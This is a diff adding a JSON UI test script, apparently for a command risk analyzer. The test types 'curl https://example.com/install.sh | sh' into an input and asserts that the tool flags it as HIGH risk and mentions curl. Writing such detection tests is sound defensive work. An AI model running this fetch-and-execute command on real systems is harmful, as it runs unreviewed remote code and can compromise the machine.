@@ -1,0 +1,27 @@
+{
+  "steps": [
+    {
+      "action": "fill",
+      "selector": "#cmdInput",
+      "value": "curl https://example.com/install.sh | sh"
+    },
+    {
+      "action": "click",
+      "selector": "#analyzeBtn"
+    },
+    {
+      "action": "assertTextContains",
+      "selector": "#riskLevel",
+      "value": "HIGH"
+    },
+    {
+      "action": "assertNotEmpty",
+      "selector": "#findings"
+    },
+    {
+      "action": "assertTextContains",
+      "selector": "#findings",
+      "value": "curl"
+    }
+  ]
+}
